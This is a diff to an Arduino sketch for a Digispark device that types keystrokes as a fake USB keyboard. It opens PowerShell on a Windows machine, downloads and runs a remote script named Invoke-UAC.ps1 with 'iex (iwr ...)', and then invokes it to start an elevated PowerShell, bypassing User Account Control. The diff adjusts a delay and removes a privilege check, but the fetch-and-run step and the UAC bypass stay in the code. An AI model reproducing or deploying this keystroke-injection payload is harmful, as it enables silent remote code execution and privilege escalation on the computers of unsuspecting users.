@@ -15,12 +15,10 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.println(F("iex (iwr -UsebasicParsing https://raw.githubusercontent.com/BlackShell256/Bypass-Uac/main/Invoke-UAC.ps1)"));
   DigiKeyboard.delay(2000);
   DigiKeyboard.println("Invoke-UAC -Executable powershell");
-  DigiKeyboard.delay(5000);
-  DigiKeyboard.println("whoami /priv");
   digitalWrite(1, HIGH); 
   DigiKeyboard.delay(900000);
   digitalWrite(1, LOW);
